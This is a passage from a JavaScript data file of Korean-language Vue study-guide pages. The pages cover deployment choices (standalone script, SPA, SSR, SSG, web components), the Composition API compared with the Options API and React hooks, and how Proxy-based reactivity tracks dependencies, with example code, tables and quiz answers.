        body: "독립 스크립트 쪽: Chrome에서 vue.esm-browser.js(575,931바이트, 컴파일러 포함)를 <script type=\"module\">로 import해 createApp({ template: '…' }).mount(el)로 수십 가지를 측정했습니다. 빌드 없이 템플릿 문자열이 컴파일됐고, in-DOM 템플릿(컨테이너 innerHTML)은 HTML 파서 규칙을 받았습니다. 운영이면 .prod.js(177,765바이트). SSR 쪽: Node에서 createSSRApp + renderToString으로 같은 컴포넌트 정의를 HTML 문자열로 만들었고, Suspense를 기다리고 Teleport를 ctx에 모으고 useId를 서버·클라이언트가 맞췄습니다. 그 사이의 SPA·SSG는 측정 대상이 아니었지만 같은 API입니다. 웹 컴포넌트 쪽은 서버 렌더에서 <my-el class=\"c\">가 그대로 나오고 객체 prop은 HTML에 안 나왔습니다(웹 컴포넌트 노드).",
        code: "// 한 끝 — 빌드 없이 (Chrome 156)\nimport { createApp } from './vue.esm-browser.js'      // 576KB · 컴파일러 포함\ncreateApp({ template: `<p>{{ msg }}</p>`, setup: () => ({ msg: ref('x') }) }).mount(el)\n\n// 다른 끝 — SSR (Node 24)\nimport { renderToString } from '@vue/server-renderer'\nawait renderToString(createSSRApp(App), ctx)          // Suspense 기다림 · ctx.teleports · useId 'v-0'\n\n// 같은 패키지 · 같은 컴포넌트 정의",
      },
      {
        label: "문제: 마케팅 사이트를 SPA 로 만들어 첫 화면이 늦다",
        body: "콘텐츠 중심의 회사 소개 사이트를 create-vue SPA로 만들었습니다. 첫 요청에 빈 HTML이 오고 JS가 내려와 실행된 뒤 글이 보여 LCP가 느리고 검색 엔진도 빈 페이지를 봅니다. 문서의 '사용 방법'이 이 자리를 가릅니다. 데이터가 빌드 때 정해지는 콘텐츠는 SSG(VitePress·Nuxt generate)로 HTML을 미리 만들어 CDN에서 바로 보이게 하고, 상호작용이 적으면 다중 페이지 SSG로 JS를 최소화합니다. 로그인 뒤 대시보드처럼 상태가 많은 부분만 SPA로 두거나 SSR(Nuxt)로 첫 화면을 서버에서 냅니다. 성능 페이지의 '아키텍처가 먼저'와 같은 결론입니다.",
      },
      {
        label: "문제가 나는 경우: 스펙트럼의 자리를 잘못 고를 때",
        body: "경우 ㄱ, 콘텐츠 사이트를 SPA입니다. 위의 사고입니다. 경우 ㄴ, 폼 하나 강화에 create-vue 전체. 과함. 독립 스크립트. 경우 ㄷ, petite-vue 신규 도입. 미유지. Vue 본체의 전역 빌드. 경우 ㄹ, 다른 프레임워크 페이지에 Vue 위젯을 SPA로 끼움. 충돌. 웹 컴포넌트(defineCustomElement). 경우 ㅁ, SEO가 필요한데 CSR만. 빈 HTML. SSR·SSG. 경우 ㅂ, 데이터가 빌드 때 정해지는데 SSR 서버 운영. 비용. SSG. 경우 ㅅ, 사용자별 실시간 데이터를 SSG. 빌드 때 굳음. SSR 또는 클라이언트 fetch. 경우 ㅇ, 직접 SSR 구축. 번들 두 벌·수화 처리. Nuxt. 경우 ㅈ, 모바일 앱에 웹뷰 SPA만. 네이티브 API. Ionic·Capacitor·Tauri. 경우 ㅊ, 백엔드 템플릿(Laravel 등)과 SPA 라우팅 중복. Inertia.js. 경우 ㅋ, 한 사이트 안에서 랜딩(정적)과 앱(SPA)을 한 번들로. 분리 배포. 경우 ㅌ, 커스텀 렌더러로 DOM 밖 렌더를 시도하다 runtime-dom API 가정. createRenderer의 노드 ops.",
        code: "경우               언제 생기나                       겉모습                        처방\nㄱ 콘텐츠 SPA       소개 사이트 SPA                    LCP 느림 · SEO 빈 페이지          SSG · SSR\nㄴ 과한 도구        폼 하나에 Vite 프로젝트              비용                          전역 빌드 스크립트\nㄷ petite-vue 신규   -                                미유지 (3.2.27)                 Vue 본체\nㄹ 타 프레임워크 끼움  SPA 통째로                        충돌                          defineCustomElement\nㅁ SEO 에 CSR       검색 노출 필요                     빈 HTML                       SSR · SSG\nㅂ 정적 데이터 SSR    빌드 때 정해지는데 서버              서버 비용                       SSG\nㅅ 실시간 SSG       사용자별 데이터                     굳음                          SSR · 클라 fetch\nㅇ 직접 SSR         Express 손수                      수화·번들 부담                   Nuxt\nㅈ 웹뷰만           네이티브 필요                      API 없음                       Ionic · Tauri\nㅊ 라우팅 중복       백엔드 템플릿 + SPA                 이중                          Inertia.js\nㅋ 한 번들          랜딩 + 앱                          랜딩도 느림                      분리\nㅌ 렌더러 가정       DOM API 기대                       안 됨                         createRenderer ops",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 자리를 정하는 변수는 셋 — 누가 HTML 을 만들고(언제), 얼마나 상호작용하나, 어디서 도나",
        body: "스펙트럼은 세 변수의 조합입니다. HTML을 누가 언제 만드나: 브라우저가 JS로(SPA·독립 스크립트), 서버가 요청마다(SSR), 빌드가 미리(SSG). 상호작용 양: 적으면 정적·다중 페이지·독립 스크립트, 많으면 SPA·하이드레이션. 실행 환경: 브라우저 DOM, 다른 프레임워크의 페이지(웹 컴포넌트), 데스크톱·모바일·터미널(커스텀 렌더러). 사고는 변수 하나를 잘못 읽을 때입니다. 콘텐츠인데 브라우저가 만들거나(ㄱ, ㅁ), 실시간인데 빌드가 만들거나(ㅅ), 위젯인데 앱 전체를 끼우거나(ㄹ). 처방은 프로젝트의 세 변수를 먼저 답하고 그 칸의 도구(전역 빌드·create-vue·Nuxt·VitePress·defineCustomElement·Tauri)를 고르는 것입니다. 모두 같은 Vue입니다.",
        code: "HTML 을 누가 언제      상호작용 양          환경                    자리\n브라우저 (JS 뒤)       적음                 기존 페이지              독립 스크립트 (전역 빌드)\n브라우저               많음                 브라우저                SPA (create-vue)\n서버 (요청마다)        많음 · SEO           Node 서버               SSR (Nuxt)\n빌드 (미리)           적음 · 콘텐츠         CDN                    SSG (VitePress · Nuxt generate)\n브라우저               위젯                 타 프레임워크 페이지        웹 컴포넌트 (defineCustomElement)\n-                    -                   데스크톱·모바일·터미널      Electron · Tauri · Ionic · 커스텀 렌더러",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "어느 자리든 쓰는 API가 Composition API이고, 그것이 왜 생겼는지가 다음 페이지 'Composition API FAQ'입니다.",
      },
      {
        label: "확인 질문",
        body: "(1) 블로그(이 사이트 같은)는 어느 자리? (2) 사내 레거시 .NET 페이지들에 공통 '알림 벨' 위젯을 넣어야 합니다. (3) 전자상거래 사이트는 상품 페이지(SEO)와 장바구니·결제(상태 많음)가 섞여 있습니다.",
        notes: [
          {
            title: "답",
            body: "(1) SSG입니다. 글은 빌드 때 정해지고 상호작용이 적어 미리 HTML을 만들어 CDN에서 바로 보이게 합니다. VitePress나 Nuxt generate. 이 블로그가 Next의 정적 export로 배포되는 것과 같은 자리입니다. 그래프처럼 상호작용이 큰 부분만 클라이언트에서 하이드레이션(아일랜드)합니다. (2) 임베디드 웹 컴포넌트입니다. defineCustomElement로 <notification-bell>을 만들어 customElements.define하면 .NET이 렌더한 어느 페이지에나 태그 하나로 끼울 수 있고 다른 프레임워크와 충돌하지 않습니다(웹 컴포넌트 노드). 페이지 전체를 SPA로 바꾸지 않습니다. 스타일은 섀도 DOM 안에 격리됩니다. (3) 풀스택 SSR(Nuxt)입니다. 상품 페이지는 서버가 요청마다(또는 ISR로 캐시) HTML을 내서 SEO와 LCP를 챙기고, 장바구니·결제는 하이드레이션 뒤 SPA처럼 상태를 다룹니다. 서버에서는 사용자별 상태를 요청마다 만들어야 샘이 없습니다(실제로 모듈 전역은 요청 간 누적). 랜딩·이벤트 페이지처럼 완전 정적인 것은 generate로 미리 만들어 분리 배포합니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Ways of Using Vue", href: `${DOCS}/guide/extras/ways-of-using-vue` },
      { label: "Server-Side Rendering", href: `${DOCS}/guide/scaling-up/ssr` },
      { label: "Vue and Web Components", href: `${DOCS}/guide/extras/web-components` },
    ],
  },

  {
    id: "vg-extra-faq",
    name: "Composition API FAQ",
    tagline: "왜 생겼나: 로직 재사용·조직·타입·번들. Options 는 그 위에 있고 폐기 계획은 없다. React 훅과는 실행 모델이 다르다",
    intro:
      "추가 주제 둘째 페이지입니다. Composition API는 'import한 함수들로 컴포넌트를 짓는 API 묶음'입니다. 반응성 API(ref·reactive…), 라이프사이클 훅(onMounted…), 의존성 주입(provide/inject). Vue 3와 2.7에 내장. '함수형 프로그래밍이 아니다'(가변·세밀한 반응성). 왜: 로직 재사용(컴포저블이 믹스인의 단점을 해결), 유연한 코드 조직(관심사별로), 더 좋은 타입 추론(this 없이 변수마다), 작은 번들(<script setup>은 인라인 컴파일로 this 프록시 접근이 없음). 관계: 'Options API는 Composition API 위에 구현'. '폐기 계획? 없다'. 둘을 setup()으로 섞을 수 있지만 이전·통합 때만. 3.3+ defineOptions. 클래스 API는 '더 이상 권장하지 않음'. React 훅과: 비슷한 아이디어지만 setup은 한 번만 돌아(stale closure 없음), 의존성 배열이 없고(자동 추적), 조건부 호출이 되고, useMemo·useCallback이 필요 없습니다. 실제로 돌려 보면 watchEffect가 읽은 것을 자동 추적했고(의존성 배열 없이), 컴파일 출력에서 <script setup>의 바인딩이 _ctx.x 대신 setup 변수를 직접 참조했으며, 라이프사이클 훅은 동기 등록이면 어디서 불러도 됐습니다. 이 노드의 질문은 하나입니다. Composition API는 무엇을 바꿨고 무엇을 바꾸지 않았나.",
    blocks: [
      {
        label: "무엇을 다루나",
        body: "정의: 'import한 함수로 컴포넌트를 작성하는 API 묶음'. 반응성 API, 라이프사이클 훅, 의존성 주입. Vue 3·2.7 내장(옛 2는 @vue/composition-api). '함수형 프로그래밍이 아니다. 가변·세밀한 반응성 위의 Composition'. 왜 넷. 로직 재사용: 컴포저블이 믹스인(출처 불명·충돌·결합)의 문제를 풂. 조직: 옵션 칸(data·methods…)이 아니라 관심사(논리 단위)로 묶어 큰 컴포넌트에서 추적이 쉬움. 타입: this 없이 변수마다 추론. 번들: '<script setup>은 템플릿을 같은 스코프의 인라인 함수로 컴파일해 this 프록시를 거치지 않고 변수를 직접 접근. 압축에도 유리'. 트레이드오프: 가드레일 없음. 보통 JS 조직 원칙 적용. Options와: 'Options API는 Composition API 위에 구현'. '폐기? 그럴 계획 없음'. 혼용은 setup() 옵션으로 가능하되 이전·통합 때만. <script setup>에 name·inheritAttrs는 3.3+ defineOptions. 컴파일 플래그로 Options API 코드 제거 가능. 클래스 API: '권장하지 않음'. React 훅 비교: 아이디어 비슷. 차이: setup은 한 번(React는 렌더마다 → stale closure), 의존성 배열 없음(자동 추적), 조건부 호출 OK(훅 순서 제약 없음), useMemo·useCallback 불필요(React Compiler가 일부 해결). 자식 컴포넌트 갱신 최적화도 자동.",
        code: "// Composition API — 관심사별 묶음 · 함수로 꺼내기\n<script setup>\nimport { ref, computed, watch, onMounted } from 'vue'\nconst { items, add } = useTodos()            // 컴포저블 (믹스인 대체)\nconst query = ref('')                        // 검색 관심사\nconst filtered = computed(() => items.value.filter(i => i.text.includes(query.value)))\nwatch(query, (q) => track('search', q))       // 의존성 배열 없음 — 소스 명시\nonMounted(() => input.value.focus())         // 동기 등록\n</script>\n\n// Options API — 같은 런타임 위 · 옵션 칸으로\nexport default { data() { return { query: '' } }, computed: { filtered() { … } }, watch: { query(q) { … } }, mounted() { … } }\n\n// React 훅과 차이\nsetup(): 한 번 실행 → 클로저가 늘 최신 (stale closure X) · watchEffect(() => …) 자동 추적 (deps 배열 X) · if (x) useComposable() OK",
        terms: [
          {
            term: "stale closure",
            body: "React 훅에서 렌더마다 함수가 다시 만들어지므로 이전 렌더의 콜백(setTimeout 안 등)이 그 시점의 변수 값을 '갇힌 채' 가지는 현상입니다. 의존성 배열이 그것을 관리하는 장치이고 useCallback·useMemo가 참조를 고정합니다. Vue의 setup은 컴포넌트 인스턴스당 한 번만 돌고 상태는 ref·reactive에 들어 있어 어느 콜백도 .value로 최신을 읽습니다. 그래서 의존성 배열과 메모이제이션 훅이 없습니다. React 노드의 '스냅샷으로서의 state'와 대비되는 자리입니다.",
          },
        ],
      },
      {
        label: "실제로 돌려 보면",
        body: "Node에서 watchEffect(() => { n.value })를 걸고 n을 바꾸니 의존성 배열 없이 다시 돌았고, 첫 await 뒤에 읽은 값은 추적되지 않았습니다(동기 구간이 '의존성 배열'의 역할). computed는 읽은 반응형 값을 스스로 추적해 캐시했습니다(useMemo 없이). compileScript 출력에서 <script setup>의 템플릿은 setup 반환 객체 없이 같은 스코프의 인라인 렌더 함수가 되어 __props.msg·count처럼 변수를 직접 참조했고(FAQ의 '번들·성능' 이유), 보통 템플릿 컴파일은 _ctx.msg(프록시 접근)였습니다. 라이프사이클 측정에서 setup은 인스턴스당 한 번, 갱신은 beforeUpdate/updated만 돌았습니다. 컴포저블 측정(effectScope, customRef)과 디렉티브 측정은 Composition API가 '함수'라서 가능한 조합이었습니다. Options API 컴포넌트({ data, template })도 같은 서버·브라우저에서 동작했습니다. 둘이 같은 런타임이라는 FAQ의 말대로입니다.",
        code: "// 의존성 배열 없음 — 자동 추적 (Node)\nwatchEffect(() => { a.value; … })   a 변경 → 다시 돎 · await 뒤 b 는 미추적 (동기 구간 = 의존성)\ncomputed(() => x.value * 2)         읽은 것 추적 · 캐시 (useMemo 없이)\n\n// <script setup> 인라인 컴파일 (compileScript)\n<script setup>: return (_ctx, _cache) => _createElementBlock(\"p\", null, _toDisplayString(__props.msg) + \" \" + _toDisplayString(__props.count))   ← 변수 직접\n보통 템플릿:    _toDisplayString(_ctx.msg)                                                                       ← 프록시 접근\n\n// setup 은 인스턴스당 1회 (라이프사이클 측정) · Options { data, template } 도 같은 런타임에서 동작",
      },
      {
        label: "문제: 'Composition API 로 바꾸면 Options API 코드는 전부 다시 써야 하나' 라는 걱정",
        body: "레거시 Options API 컴포넌트 200개가 있는 팀이 Composition API 도입을 망설입니다. FAQ의 답은 셋입니다. Options API는 폐기 계획이 없고 Composition API 위에 구현되어 같은 런타임에서 공존합니다(실제로 두 꼴 모두 동작). 한 컴포넌트 안에서 setup() 옵션으로 섞을 수 있어 점진적 이전이 됩니다(권장은 이전·통합 때만). 새 컴포넌트와 공유 로직(컴포저블)만 Composition으로 쓰고 기존은 그대로 두어도 됩니다. 비용 대비 이득이 큰 자리는 로직 재사용(믹스인 → 컴포저블)과 TS 추론이고, 그 둘이 필요한 곳부터 옮깁니다. 클래스 API(vue-class-component)만은 권장하지 않으니 그것은 이전 계획에 넣습니다.",
      },
      {
        label: "문제가 나는 경우: 둘의 관계와 모델을 오해할 때",
        body: "경우 ㄱ, 전부 다시 써야 한다는 오해입니다. 위의 사고입니다. 경우 ㄴ, Options가 곧 폐기될 거라는 오해. 계획 없음. 경우 ㄷ, React 습관으로 의존성 배열·useCallback 흉내. 불필요. 자동 추적. 경우 ㄹ, 훅 순서 규칙 걱정. Vue는 조건부 호출 OK(동기 setup 안이면). 경우 ㅁ, setup이 렌더마다 돌 거라 가정해 매번 초기화. 한 번만. 경우 ㅂ, Composition을 함수형 프로그래밍(불변)으로 오해. 가변 반응성. 경우 ㅅ, 가드레일이 없어 setup이 수백 줄. 관심사별 컴포저블로 분리. 경우 ㅇ, 믹스인 계속 사용. 출처·충돌. 컴포저블. 경우 ㅈ, 클래스 API 신규. 비권장. 경우 ㅊ, <script setup>에서 name·inheritAttrs를 위해 보통 <script> 추가. 3.3+ defineOptions. 경우 ㅋ, 혼용(setup + options)을 상시 패턴으로. 이전·통합 때만. 경우 ㅌ, Options 코드가 없는데 __VUE_OPTIONS_API__ true. 번들 축소 기회(서드파티 확인).",
        code: "경우               언제 생기나                       겉모습                         처방\nㄱ 전부 재작성 오해   도입 망설임                        -                             공존 · 점진 (setup 옵션)\nㄴ 폐기 걱정        Options 사용                       -                             계획 없음\nㄷ React 습관       deps 배열 · useCallback             불필요 코드                      자동 추적\nㄹ 순서 걱정        조건부 호출 회피                     -                             동기 setup 안이면 OK\nㅁ 매 렌더 가정      setup 에서 매번 초기화 기대            한 번만                         watch 로 반응\nㅂ FP 오해         불변 강제                           가변 반응성                       -\nㅅ 거대 setup       수백 줄                            추적 어려움                      컴포저블 분리\nㅇ 믹스인          mixins: [...]                      출처 불명 · 충돌                   컴포저블\nㅈ 클래스 API       vue-class-component                 비권장                         -\nㅊ 옵션 추가        보통 <script> 혼용                   중복                           defineOptions (3.3+)\nㅋ 상시 혼용        setup + options                    혼란                           한쪽\nㅌ 플래그 미활용     Options 없는데 true                  번들 큼                         false (확인 후)",
        codeLang: "text",
      },
      {
        label: "문제의 구조: Composition API 는 '옵션 칸' 을 '함수 호출' 로 바꾼 것이고, 반응성 모델은 그대로다",
        body: "바뀐 것: 코드의 조직 단위가 옵션 칸(data·computed·methods)에서 함수 호출(ref·computed·onMounted)로 바뀌어, 관심사별로 묶이고(ㅅ) 함수로 꺼내 재사용되며(ㅇ) this 없이 타입이 추론되고 인라인 컴파일로 작아집니다. 바뀌지 않은 것: 반응성 모델(읽은 것을 추적, 가변 ㅂ)과 런타임(Options는 그 위 ㄱ, ㄴ, ㅋ). 그래서 React 훅과 모양은 비슷해도 실행 모델이 다릅니다. setup은 한 번(ㅁ), 추적은 자동(ㄷ), 순서 제약 없음(ㄹ). 처방은 Composition API를 '새 런타임'이 아니라 '같은 런타임의 함수 표면'으로 보고, 재사용·타입이 필요한 자리부터 쓰는 것입니다.",
        code: "Options API      data · computed · methods · mounted (옵션 칸 · this)\n                 ─────── 같은 런타임 · 같은 반응성 (추적 · 가변 ㅂ) ───────\nComposition API  ref · computed · function · onMounted (함수 호출 · 변수)   → 관심사별 (ㅅ) · 컴포저블 (ㅇ) · 타입 · 인라인\n\nReact 훅과: 모양 비슷 · 모델 다름 — setup 1회 (ㅁ) · 자동 추적 (ㄷ) · 순서 자유 (ㄹ)",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "그 '같은 반응성 모델'의 내부가 다음 페이지 '반응성 심화'입니다. 실제로 돌려 보면 reactive(raw) === reactive(raw), toRaw, await 뒤 미추적, computed 안정성을 확인했습니다.",
      },
      {
        label: "확인 질문",
        body: "(1) React에서 온 동료가 computed에 '의존성 배열은 어디 적나'고 묻습니다. (2) 같은 동료가 setTimeout 콜백에서 count.value가 옛 값일까 걱정합니다. (3) Options 컴포넌트에 컴포저블 하나만 쓰고 싶습니다.",
        notes: [
          {
            title: "답",
            body: "(1) 없습니다. computed(() => a.value + b.value)는 getter가 실행되는 동안 읽은 반응형 값(a, b)을 자동으로 기록하고 그중 하나가 바뀔 때만 다시 계산합니다(실제로 두 번 읽어도 1회, 의존 변경 뒤 읽을 때 재계산). watchEffect도 같습니다. 유일한 제약은 '동기 실행 중 읽은 것만'이라 await 뒤의 읽기는 기록되지 않습니다(실제로 runs 2에서 멈춤). (2) 없습니다. setup은 인스턴스당 한 번 돌고 count는 ref 객체 하나이므로 어느 시점의 콜백이든 count.value는 현재 값입니다. React의 stale closure는 렌더마다 변수가 새로 묶이기 때문인데 Vue는 변수가 다시 묶이지 않습니다. 그래서 useCallback·의존성 배열이 없습니다. (3) setup() 옵션을 추가합니다. export default { data() {…}, setup() { const { x, y } = useMouse(); return { x, y } }, mounted() { this.x } }. setup이 돌려준 것은 this에 합쳐집니다. FAQ는 혼용을 이전·통합 때만 권하므로, 그 컴포넌트를 손볼 때 <script setup>으로 옮기는 것을 목표로 둡니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Composition API FAQ", href: `${DOCS}/guide/extras/composition-api-faq` },
      { label: "Composables", href: `${DOCS}/guide/reusability/composables` },
      { label: "setup()", href: `${DOCS}/api/composition-api-setup` },
    ],
  },

  {
    id: "vg-extra-reactivity",
    name: "반응성 심화",
    tagline: "Proxy 의 get 이 track, set 이 trigger — 구독은 WeakMap<target, Map<key, Set<effect>>> 에",
    intro:
      "추가 주제 셋째 페이지입니다. 반응성의 내부입니다. JS에는 변수 읽기·쓰기를 가로채는 방법이 둘(getter/setter, Proxy)이고 Vue 3는 reactive()에 Proxy, ref()에 getter/setter를 씁니다. 의사 코드: get(target, key) { track(target, key); return target[key] }, set(target, key, value) { target[key] = value; trigger(target, key) }. track은 '지금 실행 중인 효과'를 WeakMap<target, Map<key, Set<effect>>>에 기록하고 trigger는 그 Set의 효과들을 다시 돌립니다. watchEffect는 반응형 효과, computed는 효과로 무효화·재계산을 관리, 컴포넌트 렌더도 효과. 제약: 구조 분해하면 끊김, 프록시와 원본은 === 다름. 런타임 vs 컴파일 타임 반응성(Svelte. Reactivity Transform은 탐색 뒤 폐기). 디버깅: onRenderTracked/onRenderTriggered(개발만), computed·watch의 onTrack/onTrigger. 외부 상태(Immer·XState·RxJS)는 shallowRef에 담기. 시그널과의 관계: 'Vue의 ref는 시그널과 같은 원시 요소'(shallowRef ≈ signal, computed ≈ derived, watchEffect ≈ effect). Vapor 모드 탐색 중. 실제로 돌려 보면 reactive(raw) === reactive(raw)(캐시), reactive(rx) === rx, toRaw(rx) === raw, 구조 분해 끊김, await 뒤 미추적, 묶음(세 변경 → 효과 1회), 새 키 추가·delete 추적, 3.4 computed 안정성. 이 노드의 질문은 하나입니다. '읽는 순간 기록'은 어떻게 구현되나.",
    blocks: [
      {
        label: "무엇을 다루나",
        body: "반응성이란: A2 = A0 + A1이 A0가 바뀌면 자동으로 갱신되는 것. JS는 그렇지 않으니 whenDepsChange(update)가 필요. 어떻게: '변수 읽기·쓰기를 가로채는' 둘 중 Vue 3는 객체에 Proxy, ref에 getter/setter. function reactive(obj) { return new Proxy(obj, { get(target, key) { track(target, key); return target[key] }, set(target, key, value) { target[key] = value; trigger(target, key) } }) }. function ref(value) { const refObject = { get value() { track(refObject, 'value'); return value }, set value(newValue) { value = newValue; trigger(refObject, 'value') } } }. track: activeEffect가 있으면 getSubscribersForProperty(target, key).add(activeEffect). 구독 저장은 WeakMap<target, Map<key, Set<effect>>>. trigger: 그 Set의 효과를 전부 실행. whenDepsChange(update) { const effect = () => { activeEffect = effect; update(); activeEffect = null }; effect() }. 'watchEffect가 반응형 효과'. computed는 효과로 무효화와 재계산 관리. 컴포넌트 렌더도 효과. 제약: '구조 분해는 바인딩의 반응성을 끊음'. '프록시는 원본과 === 다름'. Vue 2는 getter/setter만(새 키 추가 불가). 런타임 vs 컴파일 타임: Vue는 런타임 기반(Svelte는 컴파일 타임). Reactivity Transform 탐색 뒤 폐기. 디버깅: onRenderTracked/onRenderTriggered(개발만. { effect, target, type: 'get'|'has'|'iterate' | 'set'|'add'|'delete'|'clear', key }). computed(getter, { onTrack, onTrigger })(Composition API만). watch 옵션도. 외부 상태: 불변 데이터(Immer useImmer), 상태 기계(XState useMachine), RxJS(@vueuse/rxjs)는 shallowRef에 담아 교체. 시그널: 'Vue ref = 시그널 원시'. Preact·Qwik ≈ shallowRef, Solid·Angular는 getter 스타일(풀림 없음). 트레이드오프: ref 풀림의 편의 vs getter의 명시성. Vapor 모드 탐색.",
        code: "// 의사 코드 (문서)\nconst targetMap = new WeakMap()   // target → Map<key, Set<effect>>\nlet activeEffect\nfunction track(target, key) { if (activeEffect) getSubscribersForProperty(target, key).add(activeEffect) }\nfunction trigger(target, key) { getSubscribersForProperty(target, key).forEach(effect => effect()) }\nfunction reactive(obj) { return new Proxy(obj, {\n  get(target, key) { track(target, key); return target[key] },\n  set(target, key, value) { target[key] = value; trigger(target, key) },\n}) }\nfunction ref(value) { const r = { get value() { track(r, 'value'); return value }, set value(v) { value = v; trigger(r, 'value') } }; return r }\nfunction whenDepsChange(update) { const effect = () => { activeEffect = effect; update(); activeEffect = null }; effect() }\n\n// 디버깅\nonRenderTracked((e) => debugger)      // 렌더가 무엇을 읽었나 (개발)\nonRenderTriggered((e) => debugger)    // 무엇이 리렌더를 일으켰나\ncomputed(() => …, { onTrack(e) {}, onTrigger(e) {} })\n\n// 시그널 대응\nshallowRef ≈ signal · computed ≈ derived · watchEffect ≈ effect",
        terms: [
          {
            term: "activeEffect 와 동기 추적",
            body: "track이 '누구를 구독자로 넣나'를 알려면 '지금 실행 중인 효과'가 전역 변수(activeEffect)에 있어야 합니다. 효과를 실행하기 직전에 그 변수를 세우고 끝나면 비우므로, 효과의 '동기 실행 중'에 일어난 get만 기록됩니다. await 뒤는 activeEffect가 이미 비워진 뒤라 기록되지 않습니다(실제로 watchEffect runs 2에서 멈춤). 구조 분해는 그 순간 한 번 get을 일으키되 그 값을 변수에 복사하므로 이후 읽기는 프록시를 거치지 않습니다.",
          },
          {
            term: "시그널 (signal)",
            body: "값을 담고 읽을 때 구독, 쓸 때 통지하는 반응형 원시 요소입니다. SolidJS·Preact·Angular·Qwik이 쓰고, Vue의 ref가 같은 것입니다(문서: 'Vue refs는 시그널과 같은 원시'). 차이는 API 모양입니다. Solid·Angular는 getter 함수(count())라 풀림이 없고, Vue·Preact는 .value 프로퍼티라 템플릿·reactive 안에서 풀립니다. computed는 derived, watchEffect는 effect에 대응합니다. Vue는 그 위에 깊은 reactive와 컴파일러 최적화를 더한 것입니다.",
          },
        ],
      },
      {
        label: "실제로 돌려 보면",
        body: "Node에서 const raw = { x: 1 }; const rx = reactive(raw)에 대해 toRaw(rx) === raw가 true, reactive(raw) === rx가 true(같은 원본엔 같은 프록시. WeakMap 캐시), reactive(rx) === rx가 true(프록시를 다시 감싸지 않음). markRaw({}) 안은 isReactive false. let { n } = state 뒤 n++은 효과를 깨우지 않았습니다(복사). watchEffect(async () => { a.value; await Promise.resolve(); b.value })는 a 변경에 다시 돌고 b 변경에는 안 돌았습니다(runs 2). 같은 틱의 list[0] = 9; list.length = 1; list.push(5)는 효과 1회(trigger가 큐에 모여 묶임). o.newKey = 1; delete o.newKey가 추적됐습니다(Proxy의 set·deleteProperty. Vue 2와 다른 점). computed(() => n % 2 === 0)에 의존하는 효과는 값이 바뀔 때만 돌았고(runs 2) 새 객체를 돌려주는 computed는 매번(runs 3). customRef(track, trigger)로 디바운스를 만들어 track/trigger를 직접 불렀습니다. shallowRef는 깊은 변경에 안 돌고 triggerRef로 강제, .value 교체에 돌았습니다. readonly 프록시에 쓰면 'Set operation on key \"z\" failed: target is readonly.' Chrome에서 reactive 안의 ref는 풀렸고(5) 배열 안은 안 풀렸으며 템플릿 {{ obj.id + 1 }}은 '[object Object]1'이었습니다.",
        code: "// Node 24 · vue 3.5.45\ntoRaw(rx) === raw ✓ · reactive(raw) === rx ✓ (캐시) · reactive(rx) === rx ✓ · markRaw 안 isReactive false\nlet { n } = state; n++ → 효과 안 돎 (복사)\nwatchEffect(async () => { a.value; await …; b.value }) → a++ runs 2 · b++ runs 2 (activeEffect 비워진 뒤)\nlist[0] = 9; list.length = 1; list.push(5) → 효과 1회 (묶음)\no.newKey = 1; delete o.newKey → 추적됨 (Proxy set · deleteProperty)\ncomputed 불리언 → 의존 효과 runs 2 (값 바뀔 때만) · 새 객체 → runs 3\ncustomRef((track, trigger) => ({ get() { track(); … }, set(v) { … trigger() } }))  → 디바운스 ref\nshallowRef: 깊은 변경 X · triggerRef ✓ · .value 교체 ✓\nreadonly 쓰기 → [Vue warn] Set operation on key \"z\" failed: target is readonly.",
      },
      {
        label: "문제: 어느 변경이 이 컴포넌트를 다시 그리는지 모른다",
        body: "큰 폼 컴포넌트가 타이핑마다 전체가 리렌더되는데 원인을 모릅니다. 처방은 디버깅 훅입니다. onRenderTriggered((e) => { console.log(e.type, e.key, e.target) })를 setup에 두면 리렌더를 일으킨 변경(type 'set'·'add'·'delete', key, target)이 찍힙니다. onRenderTracked는 렌더가 읽은 것 전부. 둘은 개발 모드에서만 동작합니다. computed가 범인이면 computed(getter, { onTrigger })로 같은 정보를 받습니다. 흔한 원인은 템플릿이 거대한 reactive 객체의 여러 키를 읽어 그중 어느 것이든 바뀌면 렌더되는 것(관심 키만 computed로 좁히기), 매번 새 객체를 돌려주는 computed(실제로 매번 깨움), 자식에 불안정한 props. 반응성의 구조(target·key 단위 구독)를 알면 '무엇을 읽었나'가 곧 '무엇에 반응하나'입니다.",
      },
      {
        label: "문제가 나는 경우: 구현을 모르고 쓸 때",
        body: "경우 ㄱ, 리렌더 원인 불명입니다. 위의 사고입니다. 경우 ㄴ, 프록시 ≠ 원본 비교. state === raw가 false. toRaw. 경우 ㄷ, 원본을 직접 바꿈. Proxy를 안 거쳐 trigger 없음. 프록시로. 경우 ㄹ, 구조 분해. get이 한 번만. toRefs. 경우 ㅁ, await 뒤 읽기. activeEffect 없음(실제로). await 전. 경우 ㅂ, Map 키·Set 요소에 ref. 풀리지 않음. .value. 경우 ㅅ, 외부 불변 라이브러리 결과를 reactive에. 깊은 변환 충돌. shallowRef + 교체. 경우 ㅇ, 거대 객체 reactive. 모든 중첩에 Proxy. shallowRef·markRaw. 경우 ㅈ, 디버깅 훅을 운영에서 기대. 개발만. 경우 ㅊ, computed의 onTrack을 Options API에서. Composition만. 경우 ㅋ, Reactivity Transform($ref) 사용. 폐기. 보통 ref. 경우 ㅌ, Vue 2 습관으로 새 키 추가가 안 될 거라 Vue.set. Vue 3는 Proxy라 됨(실제로). 경우 ㅍ, 시그널 라이브러리처럼 count()로 읽음. Vue는 .value.",
        code: "경우               언제 생기나                       겉모습                          처방\nㄱ 원인 불명        전체 리렌더                        -                             onRenderTriggered · onTrigger\nㄴ 정체 비교        state === raw                     false                          toRaw\nㄷ 원본 변경        raw.x = 1                         trigger 없음                     프록시\nㄹ 구조 분해        const { x } = state               get 1회 · 끊김 (실제로)            toRefs\nㅁ await 뒤        watchEffect(async)                미추적 (실제로)                   await 전\nㅂ 컬렉션 ref       map.get('k')                      ref 그대로                       .value\nㅅ 불변 라이브러리    Immer 결과 reactive               충돌                            shallowRef\nㅇ 거대 객체        deep reactive                     Proxy 비용                       shallowRef · markRaw\nㅈ 운영 디버깅       onRenderTracked                   안 돎                           개발\nㅊ Options onTrack   computed 옵션                     없음                            Composition\nㅋ $ref            Reactivity Transform               폐기                            ref\nㅌ Vue.set 습관     새 키                             불필요 